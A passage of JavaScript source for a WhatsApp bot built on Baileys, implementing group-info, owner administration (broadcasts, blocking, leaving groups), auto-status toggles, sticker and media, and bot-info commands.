        if (!isGroup) return mzazireply("❌ Group only!");
        const gs7 = getGroupSettings(sender);
        const settings7 = [
          ["antilink", "🔗 Anti-link"],["antitag","🏷️ Anti-tag"],["antibot","🤖 Anti-bot"],
          ["antiviewonce","👁️ Anti-view once"],["antitagadmin","👮 Anti-tag admin"],
          ["antimentiongroup","📢 Anti-mention all"],["antipromote","⬆️ Anti-promote"],
          ["antidemote","⬇️ Anti-demote"],["welcome","👋 Welcome"],["goodbye","👋 Goodbye"],
          ["antiflood","🌊 Anti-flood"],["antibadword","🤬 Anti-bad word"],["antisticker","🖼️ Anti-sticker"]
        ];
        let statusText = `⚙️ *GROUP SETTINGS*\n\n📛 Group: ${groupName}\n\n`;
        settings7.forEach(([key, label]) => {
          statusText += `${label}: ${gs7[key] ? "✅ ON" : "❌ OFF"}\n`;
        });
        mzazireply(statusText);
        break;
      }

//=====================================//

      case "memberscount":
//=====================================//

      case "count": {
        if (!isGroup) return mzazireply("❌ Group only!");
        mzazireply(`👥 *MEMBERS COUNT*\n\n📛 Group: ${groupName}\n👥 Total: ${participants.length} members\n👑 Admins: ${groupAdmins.length}\n👤 Regular: ${participants.length - groupAdmins.length}`);
        break;
      }

//=====================================//

      case "groupmembers":
//=====================================//

      case "members": {
        if (!isGroup) return mzazireply("❌ Group only!");
        let memberList = `👥 *GROUP MEMBERS*\n\n📛 ${groupName}\n\n`;
        participants.forEach((p, i) => {
          const isA = groupAdmins.includes(normalizeJid(p.id));
          memberList += `${i+1}. ${isA ? "👑" : "👤"} @${jidToNumber(p.id)}\n`;
        });
        memberList += `\n📊 Total: ${participants.length}`;
        await mzazi.sendMessage(sender, { text: memberList, mentions: participants.map(p=>p.id) }, { quoted: m });
        break;
      }

//=====================================//

      case "myid": {
        mzazireply(`🆔 *YOUR ID*\n\n📱 Number: ${senderNum}\n🆔 JID: ${msgSender}\n${isGroup ? `\n👥 Group: ${sender}` : ""}`);
        break;
      }

//=====================================//

      case "groupid": {
        if (!isGroup) return mzazireply("❌ Group only!");
        mzazireply(`🆔 *GROUP ID*\n\n📛 Name: ${groupName}\n🆔 JID: ${sender}\n👥 Members: ${participants.length}`);
        break;
      }

//=====================================//

      case "chatid": {
        mzazireply(`🆔 *CHAT ID*\n\n${sender}`);
        break;
      }

//=====================================//

      case "invitegroup":
//=====================================//

      case "invitelink": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        try {
          const code2 = await mzazi.groupInviteCode(sender);
          mzazireply(`🔗 *GROUP INVITE LINK*\n\nhttps://chat.whatsapp.com/${code2}\n\n_Share this link to invite people_`);
        } catch(e) { mzazireply("❌ Failed to get invite link"); }
        break;
      }

//=====================================//

      case "pin": {
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        const quoted2 = m.message?.extendedTextMessage?.contextInfo;
        if (!quoted2) return mzazireply(`Reply to a message with ${prefix}pin`);
        try {
          await mzazi.sendMessage(sender, { pin: { type: 1, time: 86400 }, key: { remoteJid: sender, id: quoted2.stanzaId, participant: quoted2.participant } });
          mzazireply("📌 Message pinned!");
        } catch(e) { mzazireply("❌ Failed to pin message (not supported in all groups)"); }
        break;
      }

//=====================================//

      case "poll": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!text) return mzazireply(`Example: ${prefix}poll Question | Option1 | Option2 | Option3`);
        const pollParts = text.split("|").map(p => p.trim());
        if (pollParts.length < 3) return mzazireply("Need at least a question and 2 options!\nExample: .poll Favorite fruit? | Mango | Apple | Banana");
        const [pollQuestion, ...pollOptions] = pollParts;
        try {
          await mzazi.sendMessage(sender, { poll: { name: pollQuestion, values: pollOptions, selectableCount: 1 } }, { quoted: m });
        } catch(e) { mzazireply("❌ Failed to create poll"); }
        break;
      }

      // ═══════════════════════════════════════════════════════
      //  OWNER COMMANDS EXTENDED
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "broadcast":
//=====================================//

      case "bc": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        if (!text) return mzazireply(`Usage: ${prefix}broadcast <message>`);
        try {
          const groups2 = await mzazi.groupFetchAllParticipating();
          const groupIds = Object.keys(groups2);
          let sent = 0;
          for (const gid of groupIds) {
            try {
              await mzazi.sendMessage(gid, { text: `📢 *BROADCAST*\n\n${text}\n\n_Sent by ${botName}_` });
              sent++;
              await new Promise(r => setTimeout(r, 300));
            } catch(e) {}
          }
          mzazireply(`✅ Broadcast sent to ${sent}/${groupIds.length} groups!`);
        } catch(e) { mzazireply("❌ Broadcast failed"); }
        break;
      }

//=====================================//

      case "broadcastdm":
//=====================================//

      case "bcdm": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        if (!text) return mzazireply(`Usage: ${prefix}broadcastdm <message>`);
        mzazireply("⏳ Broadcasting to DM list...");
        const pairedUsers = loadJSON("./database/paired.json", []);
        let dmSent = 0;
        for (const user of pairedUsers) {
          try {
            const jidUser = user.includes("@") ? user : `${user}@s.whatsapp.net`;
            await mzazi.sendMessage(jidUser, { text: `📢 *MESSAGE FROM BOT OWNER*\n\n${text}` });
            dmSent++;
            await new Promise(r => setTimeout(r, 200));
          } catch(e) {}
        }
        mzazireply(`✅ Sent to ${dmSent} users`);
        break;
      }

//=====================================//

      case "block": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const mentioned3 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid;
        if (!mentioned3?.length && !text) return mzazireply(`Usage: ${prefix}block @user`);
        const targetBlock = mentioned3?.[0] || `${text.replace(/\D/g,"")}@s.whatsapp.net`;
        try {
          await mzazi.updateBlockStatus(targetBlock, "block");
          mzazireply(`✅ @${jidToNumber(targetBlock)} has been blocked!`);
        } catch(e) { mzazireply("❌ Failed to block user"); }
        break;
      }

//=====================================//

      case "unblock": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const mentioned4 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid;
        if (!mentioned4?.length && !text) return mzazireply(`Usage: ${prefix}unblock @user`);
        const targetUnblock = mentioned4?.[0] || `${text.replace(/\D/g,"")}@s.whatsapp.net`;
        try {
          await mzazi.updateBlockStatus(targetUnblock, "unblock");
          mzazireply(`✅ @${jidToNumber(targetUnblock)} has been unblocked!`);
        } catch(e) { mzazireply("❌ Failed to unblock user"); }
        break;
      }

//=====================================//

      case "clearstate": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        try {
          await mzazi.sendPresenceUpdate("unavailable", sender);
          mzazireply("✅ Presence cleared!");
        } catch(e) { mzazireply("❌ Failed to clear state"); }
        break;
      }

//=====================================//

      case "setpresence": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const presences = ["available","unavailable","composing","recording","paused"];
        if (!text || !presences.includes(text)) return mzazireply(`Usage: ${prefix}setpresence <type>\nTypes: ${presences.join(", ")}`);
        try {
          await mzazi.sendPresenceUpdate(text, sender);
          mzazireply(`✅ Presence set to: ${text}`);
        } catch(e) { mzazireply("❌ Failed to set presence"); }
        break;
      }

//=====================================//

      case "deleteowner":
//=====================================//

      case "delowner": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const mentioned5 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid;
        if (!mentioned5?.length) return mzazireply(`Usage: ${prefix}delowner @user`);
        const targetDel = jidToNumber(mentioned5[0]);
        if (targetDel === botPhoneNum) return mzazireply("❌ Cannot remove bot's own owner status!");
        delOwner(targetDel);
        mzazireply(`✅ @${targetDel} removed from owners!`);
        break;
      }

//=====================================//

      case "listowners":
//=====================================//

      case "owners": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const ownerList2 = getOwners();
        if (!ownerList2.length) return mzazireply("📭 No owners set!");
        let ownerTxt = `👑 *OWNERS LIST*\n\n`;
        ownerList2.forEach((o,i) => { ownerTxt += `${i+1}. +${o}\n`; });
        ownerTxt += `\nTotal: ${ownerList2.length}`;
        mzazireply(ownerTxt);
        break;
      }

//=====================================//

      case "setbotbio":
//=====================================//

      case "setbio": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        if (!text) return mzazireply(`Usage: ${prefix}setbio <new bio>`);
        try {
          await mzazi.updateProfileStatus(text);
          mzazireply(`✅ Bot bio updated: ${text}`);
        } catch(e) { mzazireply("❌ Failed to update bio"); }
        break;
      }

//=====================================//

      case "setbotname": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        if (!text) return mzazireply(`Usage: ${prefix}setbotname <name>`);
        try {
          await mzazi.updateProfileName(text);
          mzazireply(`✅ Bot profile name updated: ${text}`);
        } catch(e) { mzazireply("❌ Failed to update profile name"); }
        break;
      }

//=====================================//

      case "listgroups":
//=====================================//

      case "allgroups": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        try {
          const allGroups = await mzazi.groupFetchAllParticipating();
          const groupArr = Object.values(allGroups);
          if (!groupArr.length) return mzazireply("📭 Not in any groups");
          let gText = `📂 *ALL GROUPS (${groupArr.length})*\n\n`;
          groupArr.slice(0,50).forEach((g, i) => {
            gText += `${i+1}. ${g.subject} (${g.participants.length} members)\n`;
          });
          if (groupArr.length > 50) gText += `\n_...and ${groupArr.length - 50} more_`;
          mzazireply(gText);
        } catch(e) { mzazireply("❌ Failed to fetch groups"); }
        break;
      }

//=====================================//

      case "leaveall": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        if (text !== "confirm") return mzazireply(`⚠️ This will leave ALL groups!\nType: ${prefix}leaveall confirm to proceed`);
        try {
          const allGroups2 = await mzazi.groupFetchAllParticipating();
          const groupIds2 = Object.keys(allGroups2);
          for (const gid of groupIds2) {
            try {
              await mzazi.groupLeave(gid);
              await new Promise(r => setTimeout(r, 500));
            } catch(e) {}
          }
          mzazireply(`✅ Left ${groupIds2.length} groups!`);
        } catch(e) { mzazireply("❌ Failed"); }
        break;
      }

//=====================================//

      case "setprefix2":
//=====================================//

      case "prefix2": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        if (!text) return mzazireply(
          `📌 *Current prefix:* \`${prefix || "none (no prefix)"}\`\n` +
          `Usage: ${prefix || ""}setprefix2 !\n` +
          `To remove prefix: ${prefix || ""}setprefix2 none`
        );
        const sp = loadJSON(`./database/sessions/${botPhoneNum}/settings.json`, {});
        if (text.toLowerCase() === "none") {
          sp.customPrefix = "";
          saveJSON(`./database/sessions/${botPhoneNum}/settings.json`, sp);
          return mzazireply("✅ Prefix removed.\nCommands can now be used without a prefix.\nExample: menu, ping, alive");
        }
        sp.customPrefix = text.slice(0,3);
        saveJSON(`./database/sessions/${botPhoneNum}/settings.json`, sp);
        mzazireply(`✅ Prefix changed to: \`${text.slice(0,3)}\``);
        break;
      }

//=====================================//

      case "restart": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        await mzazireply("🔄 Restarting bot...");
        setTimeout(() => process.exit(0), 1000);
        break;
      }

//=====================================//

      case "shutdown": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        if (text !== "confirm") return mzazireply(`⚠️ This will stop the bot!\nType: ${prefix}shutdown confirm`);
        await mzazireply("💤 Bot shutting down...");
        setTimeout(() => process.exit(1), 1000);
        break;
      }

//=====================================//

      case "botstatus": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const used2 = process.memoryUsage();
        const allGrps = await mzazi.groupFetchAllParticipating().catch(() => ({}));
        mzazireply(`🤖 *BOT STATUS*\n\n✅ Online\n⏰ Uptime: ${runtime(process.uptime())}\n💾 RAM: ${(used2.heapUsed/1024/1024).toFixed(2)} MB\n📦 Groups: ${Object.keys(allGrps).length}\n👑 Owners: ${getOwners().length}\n💎 Paid: ${paidUsers.length}`);
        break;
      }

//=====================================//

      case "sendmsg":
//=====================================//

      case "sendmessage": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const parts3 = text.split("|");
        if (parts3.length < 2) return mzazireply(`Usage: ${prefix}sendmsg 254XXXXXXXXX | message`);
        const [targetNum2, ...msgParts] = parts3;
        const targetJid2 = `${targetNum2.trim().replace(/\D/g,"")}@s.whatsapp.net`;
        await mzazi.sendMessage(targetJid2, { text: msgParts.join("|").trim() });
        mzazireply(`✅ Message sent to ${targetNum2.trim()}`);
        break;
      }

//=====================================//

      case "clearchat": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        mzazireply("✅ Chat clear command sent (client-side action)");
        break;
      }

      // ═══════════════════════════════════════════════════════
      //  AUTO FEATURES COMMANDS
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "autotyping2":
//=====================================//

      case "composing": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const sub2 = args[0]?.toLowerCase();
        if (!sub2 || !["on","off"].includes(sub2)) {
          const cfg2 = getToggle("autotyping");
          return mzazireply(`⌨️ *AUTO TYPING (COMPOSING)*\n\nStatus: ${cfg2.enabled ? "✅ ON" : "❌ OFF"}\n\nWhen ON, bot shows 'typing...' indicator before every response.\n\nUsage: ${prefix}composing on/off`);
        }
        setToggle("autotyping", sub2 === "on");
        mzazireply(`⌨️ Auto-typing (composing): ${sub2 === "on" ? "✅ ON" : "❌ OFF"}\n\n${sub2 === "on" ? "Bot will now show typing indicator before replies!" : "Typing indicator disabled."}`);
        break;
      }

//=====================================//

      case "autorecording":
//=====================================//

      case "recording": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const sub3 = args[0]?.toLowerCase();
        if (!sub3 || !["on","off"].includes(sub3)) {
          const cfg3 = getToggle("autotyping");
          return mzazireply(`🎙️ *AUTO RECORDING (COMPOSING)*\n\nStatus: ${cfg3.enabled ? "✅ ON" : "❌ OFF"}\n\nWhen ON, bot shows 'recording...' indicator before audio responses.\n\nUsage: ${prefix}recording on/off`);
        }
        setToggle("autorecording", sub3 === "on");
        mzazireply(`🎙️ Auto-recording indicator: ${sub3 === "on" ? "✅ ON" : "❌ OFF"}`);
        break;
      }

//=====================================//

      case "autoreact": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const sub4 = args[0]?.toLowerCase();
        if (!["on","off"].includes(sub4)) return mzazireply(`Usage: ${prefix}autoreact on/off`);
        setToggle("autoreact", sub4 === "on");
        mzazireply(`⚡ Auto-react (⚡ emoji on commands): ${sub4 === "on" ? "✅ ON" : "❌ OFF"}`);
        break;
      }

//=====================================//

      case "autostatus":
//=====================================//

      case "autoviewstatus": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const sub5 = args[0]?.toLowerCase();
        if (!["on","off"].includes(sub5)) {
          const cfg5 = getToggle("autostatus");
          return mzazireply(`👁️ *AUTO STATUS VIEW*\n\nStatus: ${cfg5.enabled ? "✅ ON" : "❌ OFF"}\n\nUsage: ${prefix}autostatus on/off`);
        }
        setToggle("autostatus", sub5 === "on");
        mzazireply(`👁️ Auto status view: ${sub5 === "on" ? "✅ ON" : "❌ OFF"}`);
        break;
      }

//=====================================//

      case "autolike":
//=====================================//

      case "autolikestatus": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const sub6 = args[0]?.toLowerCase();
        if (!["on","off"].includes(sub6)) {
          const cfg6 = getToggle("autolike");
          const ssPath = sessionFile("statusSettings.json");
          const ss = loadJSON(ssPath, { emoji: "❤️" });
          return mzazireply(`❤️ *AUTO LIKE STATUS*\n\nStatus: ${cfg6.enabled ? "✅ ON" : "❌ OFF"}\nEmoji: ${ss.emoji}\n\nUsage: ${prefix}autolike on/off\nChange emoji: ${prefix}statuslikeemoji <emoji>`);
        }
        setToggle("autolike", sub6 === "on");
        mzazireply(`❤️ Auto like status: ${sub6 === "on" ? "✅ ON" : "❌ OFF"}`);
        break;
      }

//=====================================//

      case "statuslikeemoji":
//=====================================//

      case "setlikeemoji": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const ssPath2 = sessionFile("statusSettings.json");
        const ss2 = loadJSON(ssPath2, { emoji: "❤️" });
        if (!text) {
          return mzazireply(`❤️ *STATUS LIKE EMOJI*\n\nCurrent emoji: ${ss2.emoji}\n\nUsage: ${prefix}statuslikeemoji <emoji>\nExample: ${prefix}statuslikeemoji 🔥`);
        }
        const newEmoji = text.trim().split(/\s+/)[0];
        ss2.emoji = newEmoji;
        saveJSON(ssPath2, ss2);
        mzazireply(`✅ Status like emoji set to: ${newEmoji}\n\nBot will react with this emoji when auto-liking statuses.`);
        break;
      }

//=====================================//

      case "statusviewerstatus":
//=====================================//

      case "autoviewstatus2": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const cfg5b = getToggle("autostatus");
        const cfg6b = getToggle("autolike");
        const ssPathB = sessionFile("statusSettings.json");
        const ssB = loadJSON(ssPathB, { emoji: "❤️" });
        mzazireply(
          `📊 *STATUS FEATURES*\n\n` +
          `👁️ Auto View Status: ${cfg5b.enabled ? "✅ ON" : "❌ OFF"}\n` +
          `❤️ Auto Like Status: ${cfg6b.enabled ? "✅ ON" : "❌ OFF"}\n` +
          `🎭 Like Emoji: ${ssB.emoji}\n\n` +
          `Commands:\n• ${prefix}autostatus on/off\n• ${prefix}autolike on/off\n• ${prefix}statuslikeemoji <emoji>`
        );
        break;
      }

//=====================================//

      case "autoread":
//=====================================//

      case "readall": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const sub7 = args[0]?.toLowerCase();
        if (!["on","off"].includes(sub7)) {
          const cfg7 = getToggle("autoread");
          return mzazireply(`✅ *AUTO READ*\n\nStatus: ${cfg7.enabled ? "✅ ON" : "❌ OFF"}\n\nUsage: ${prefix}autoread on/off`);
        }
        setToggle("autoread", sub7 === "on");
        mzazireply(`✅ Auto read messages: ${sub7 === "on" ? "✅ ON" : "❌ OFF"}`);
        break;
      }

//=====================================//

      case "autoforwardstatus": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const sub8 = args[0]?.toLowerCase();
        if (!["on","off"].includes(sub8)) {
          const cfg8 = getToggle("autoforwardstatus");
          return mzazireply(`📤 *AUTO FORWARD STATUS*\n\nStatus: ${cfg8.enabled ? "✅ ON" : "❌ OFF"}\n\nUsage: ${prefix}autoforwardstatus on/off`);
        }
        setToggle("autoforwardstatus", sub8 === "on");
        mzazireply(`📤 Auto forward status: ${sub8 === "on" ? "✅ ON" : "❌ OFF"}`);
        break;
      }

//=====================================//

      case "anticall": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const sub9 = args[0]?.toLowerCase();
        if (!["on","off"].includes(sub9)) {
          const cfg9 = getToggle("anticall");
          return mzazireply(`📵 *ANTI CALL*\n\nStatus: ${cfg9.enabled ? "✅ ON" : "❌ OFF"}\n\nUsage: ${prefix}anticall on/off`);
        }
        setToggle("anticall", sub9 === "on");
        mzazireply(`📵 Anti-call: ${sub9 === "on" ? "✅ ON - Bot will reject all calls" : "❌ OFF"}`);
        break;
      }

//=====================================//

      case "antimsg":
//=====================================//

      case "antimessage": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const sub10 = args[0]?.toLowerCase();
        if (!["on","off"].includes(sub10)) return mzazireply(`Usage: ${prefix}antimsg on/off`);
        setToggle("antimsg", sub10 === "on");
        mzazireply(`🔕 Anti-message (DM blocker): ${sub10 === "on" ? "✅ ON" : "❌ OFF"}`);
        break;
      }

//=====================================//

      case "autostatustext": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        if (!text) return mzazireply(`Usage: ${prefix}autostatustext <status message>`);
        try {
          await mzazi.updateProfileStatus(text);
          mzazireply(`✅ Status updated: ${text}`);
        } catch(e) { mzazireply("❌ Failed to update status"); }
        break;
      }

      // ═══════════════════════════════════════════════════════
      //  STICKER & MEDIA COMMANDS
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "toimg":
//=====================================//

      case "stickertoimg": {
        const quoted3 = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        if (!quoted3?.stickerMessage) return mzazireply(`Reply to a sticker with ${prefix}toimg`);
        try {
          const buf2 = await downloadMediaMessage({ key: m.key, message: quoted3 }, "buffer", {}, { logger: pino({ level:"silent" }), reuploadRequest: mzazi.updateMediaMessage });
          await mzazi.sendMessage(sender, { image: buf2, caption: "✅ Converted to image!" }, { quoted: m });
        } catch(e) { mzazireply("❌ Failed to convert sticker"); }
        break;
      }

//=====================================//

      case "take":
//=====================================//

      case "steal": {
        if (!isOwner && !isAdmin) return mzazireply("❌ Admins only!");
        const quoted4 = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        if (!quoted4?.stickerMessage) return mzazireply(`Reply to a sticker with ${prefix}take`);
        try {
          const buf3 = await downloadMediaMessage({ key: m.key, message: quoted4 }, "buffer", {}, { logger: pino({ level:"silent" }), reuploadRequest: mzazi.updateMediaMessage });
          await mzazi.sendMessage(sender, { sticker: buf3 }, { quoted: m });
          
        } catch(e) { mzazireply("❌ Failed to steal sticker"); }
        break;
      }

//=====================================//

      case "forward": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const quotedFwd = m.message?.extendedTextMessage?.contextInfo;
        if (!quotedFwd || !text) return mzazireply(`Reply to a message and provide target number!\nUsage: ${prefix}forward 254XXXXXXXXX`);
        const fwdJid = `${text.replace(/\D/g,"")}@s.whatsapp.net`;
        const fwdMsg = { forward: m };
        await mzazi.sendMessage(fwdJid, { text: "Forwarded message from bot owner" });
        mzazireply("✅ Forwarded!");
        break;
      }

//=====================================//

      case "vcard": {
        if (!text) return mzazireply(`Example: ${prefix}vcard John Doe | 254712345678`);
        const [vcName, vcNum] = text.split("|").map(s=>s.trim());
        if (!vcName || !vcNum) return mzazireply("Format: Name | Number");
        const vcard2 = `BEGIN:VCARD\nVERSION:3.0\nN:${vcName}\nFN:${vcName}\nTEL;type=CELL;type=VOICE;waid=${vcNum.replace(/\D/g,"")}:+${vcNum.replace(/\D/g,"")}\nEND:VCARD`;
        await mzazi.sendMessage(sender, { contacts: { displayName: vcName, contacts: [{ vcard: vcard2 }] } }, { quoted: m });
        break;
      }

//=====================================//

      case "location": {
        const parts4 = text.split(",");
        if (parts4.length < 2) return mzazireply(`Example: ${prefix}location -1.286389,36.817223`);
        const [lat2, lon2] = parts4.map(p => parseFloat(p.trim()));
        if (isNaN(lat2) || isNaN(lon2)) return mzazireply("❌ Invalid coordinates");
        await mzazi.sendMessage(sender, { location: { degreesLatitude: lat2, degreesLongitude: lon2 } }, { quoted: m });
        break;
      }

//=====================================//

      case "nairobi": {
        await mzazi.sendMessage(sender, { location: { degreesLatitude: -1.286389, degreesLongitude: 36.817223, name: "Nairobi, Kenya", address: "Capital City of Kenya" } }, { quoted: m });
        break;
      }

//=====================================//

      case "mombasa": {
        await mzazi.sendMessage(sender, { location: { degreesLatitude: -4.043477, degreesLongitude: 39.668206, name: "Mombasa, Kenya", address: "Coast City, Kenya" } }, { quoted: m });
        break;
      }

      // ═══════════════════════════════════════════════════════
      //  INFORMATION COMMANDS
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "whois":
//=====================================//

      case "userinfo": {
        const mentioned6 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid;
        const targetJid3 = mentioned6?.[0] || msgSender;
        const targetNum3 = jidToNumber(targetJid3);
        const isTargetAdmin = isGroup && groupAdmins.includes(normalizeJid(targetJid3));
        const isTargetOwner2 = getOwners().includes(targetNum3);
        const isTargetPaid = paidUsers.includes(targetJid3) || paidUsers.includes(targetNum3);
        let ppUrl2 = null;
        try { ppUrl2 = await mzazi.profilePictureUrl(targetJid3, "image"); } catch(e) {}
        const statusText2 = [
          isTargetOwner2 ? "👑 Bot Owner" : null,
          isTargetAdmin ? "🛡️ Group Admin" : null,
          isTargetPaid ? "💎 Paid User" : null
        ].filter(Boolean).join(" | ") || "👤 Regular User";
        mzazireply(`🔍 *USER INFO*\n\n📱 Number: +${targetNum3}\n🆔 JID: ${targetJid3}\n🏷️ Status: ${statusText2}\n📸 Photo: ${ppUrl2 ? "✅ Has photo" : "❌ No photo"}`);
        break;
      }

//=====================================//

      case "botinfo":
//=====================================//

      case "about": {
        const used3 = process.memoryUsage();
        mzazireply(`🤖 *BOT INFO*\n\n📛 Name: ${botName}\n📱 Number: ${botPhoneNum}\n⏰ Uptime: ${runtime(process.uptime())}\n💾 RAM: ${(used3.heapUsed/1024/1024).toFixed(2)} MB\n🖥️ Platform: ${os.platform()}\n⚡ Node.js: ${process.version}\n📦 Version: 2.0.0\n\n_Powered by Mzazi Tech Inc_`);
        break;
      }

//=====================================//

      case "credits":
//=====================================//

      case "creditsp": {
        mzazireply(`🙏 *CREDITS*\n\n┌──────────────┐\n│ Allah SWT\n│ Developer: Mzazi\n│ Baileys Library\n│ Node.js Community\n│ All Beta Testers\n└──────────────┘\n\n💖 Thank you all!`);
        break;
      }

//=====================================//

      case "version":
//=====================================//

      case "ver": {
        mzazireply(`📦 *VERSION INFO*\n\n🤖 Bot: ${botName}\n🔢 Version: 2.0.0\n📱 Baileys: @whiskeysockets/baileys\n⚡ Node.js: ${process.version}\n💻 Platform: ${os.platform()}`);
        break;
      }

//=====================================//

      case "speed":
//=====================================//

      case "test2": {
        const t1 = Date.now();
        await mzazi.sendPresenceUpdate("composing", sender);
        const t2 = Date.now();
        mzazireply(`⚡ *SPEED TEST*\n\n🏓 Ping: ${Date.now() - startTime}ms\n🔌 Connection: ${t2-t1}ms\n✅ Status: Online`);
        break;
      }

//=====================================//

      case "stats": {
        const allGrps3 = await mzazi.groupFetchAllParticipating().catch(() => ({}));
        mzazireply(`📊 *BOT STATS*\n\n👥 Groups: ${Object.keys(allGrps3).length}\n💎 Paid Users: ${paidUsers.length}\n👑 Owners: ${getOwners().length}\n⏰ Uptime: ${runtime(process.uptime())}\n💾 RAM: ${(process.memoryUsage().heapUsed/1024/1024).toFixed(2)} MB`);
        break;
      }

//=====================================//

      case "help": {
        mzazireply(`📖 *HELP*\n\n🔍 Use ${prefix}menu to see all commands\n📋 Commands are organized by category\n⚡ Prefix: ${prefix}\n\n💡 Quick commands:\n• ${prefix}ping - Check bot status\n• ${prefix}menu - All commands\n• ${prefix}uptime - Bot uptime\n• ${prefix}owner - Bot owner info\n• ${prefix}repo - Bot repository`);
        break;
      }

//=====================================//

      case "runtime":
//=====================================//

      case "uptime2": {
        mzazireply(`⏱️ *RUNTIME*\n\n${runtime(process.uptime())}\n\n✅ Bot is running smoothly!`);
        break;
      }

//=====================================//

      case "news": {
        mzazireply(`📰 *NEWS*\n\n_Getting latest headlines..._\n\nVisit news sites for latest updates:\n• BBC: bbc.com/news\n• CNN: cnn.com\n• Reuters: reuters.com`);
        break;
      }

      // ═══════════════════════════════════════════════════════
      //  BOT SETTINGS COMMANDS
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "setmode": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const modes = ["public","private","group"];
        if (!text || !modes.includes(text)) return mzazireply(`Usage: ${prefix}setmode <mode>\nModes: ${modes.join(", ")}`);
        const modeSettings = loadJSON(`./database/sessions/${botPhoneNum}/settings.json`, {});
        modeSettings.mode = text;
        modeSettings.publicMode = text === "public";
        modeSettings.selfMode = text === "private";
        saveJSON(`./database/sessions/${botPhoneNum}/settings.json`, modeSettings);
        mzazireply(`✅ Bot mode: ${text.toUpperCase()}`);
        break;
      }

//=====================================//

      case "botmode": {
        const modeSet = loadJSON(`./database/sessions/${botPhoneNum}/settings.json`, {});
        const mode2 = modeSet.mode || (modeSet.publicMode ? "public" : modeSet.selfMode ? "private" : "public");
        mzazireply(`⚙️ *BOT MODE*\n\nCurrent: ${mode2.toUpperCase()}\n\n🌍 Public - Everyone can use\n🔒 Private - Owner only\n👥 Group - Groups only\n\nChange: ${prefix}setmode <mode>`);
        break;
      }

//=====================================//

      case "resetbot": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        if (text !== "confirm") return mzazireply(`⚠️ This resets ALL bot settings!\nType: ${prefix}resetbot confirm`);
        const defaultSettings = { publicMode: true, selfMode: false };
        saveJSON(`./database/sessions/${botPhoneNum}/settings.json`, defaultSettings);
        mzazireply("✅ Bot settings reset to defaults!");
        break;
      }

//=====================================//

      case "changebotpic":
//=====================================//

      case "setmenupic": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const quotedBP = m.message?.extendedTextMessage?.contextInfo?.quotedMessage || message;
        if (!quotedBP?.imageMessage && !message?.imageMessage) {
          return mzazireply(`📸 Send/reply to an image with:\n${prefix}changebotpic`);
        }
        try {
          let msgBP = m;
          if (quotedBP?.imageMessage && m.message?.extendedTextMessage) {
            msgBP = { key: { remoteJid: sender, id: m.message.extendedTextMessage.contextInfo.stanzaId, participant: m.message.extendedTextMessage.contextInfo.participant }, message: quotedBP };
          }
          const bufBP = await downloadMediaMessage(msgBP, "buffer", {}, { logger: pino({ level:"silent" }), reuploadRequest: mzazi.updateMediaMessage });
          const saveBP = `./database/sessions/${botPhoneNum}/menu.jpg`;
          fs.mkdirSync(`./database/sessions/${botPhoneNum}`, { recursive: true });
          fs.writeFileSync(saveBP, bufBP);
          mzazireply("✅ Bot menu picture updated!");
        } catch(e) { mzazireply("❌ Failed to update bot picture"); }
        break;
      }

//=====================================//

      case "listcmds":
//=====================================//

      case "allcmds": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        try {
          const caseData = fs.readFileSync("./case.js", "utf8");
          const caseMatches = [...caseData.matchAll(/case\s+["']([^"']+)["']/g)];
          const uniqueCases = [...new Set(caseMatches.map(m2 => m2[1]))];
          let cmdTxt = `📋 *ALL COMMANDS (${uniqueCases.length})*\n\n`;
          uniqueCases.slice(0,100).forEach((c, i) => { cmdTxt += `${i+1}. ${prefix}${c}\n`; });
          if (uniqueCases.length > 100) cmdTxt += `\n_...and ${uniqueCases.length - 100} more_`;
          mzazireply(cmdTxt);
        } catch(e) { mzazireply("❌ Failed to list commands"); }
        break;
      }

//=====================================//

      case "ping3": {
        const l2 = Date.now() - startTime;
        mzazireply(`🏓 *PONG!*\n\n⚡ Speed: ${l2}ms\n✅ Active`);
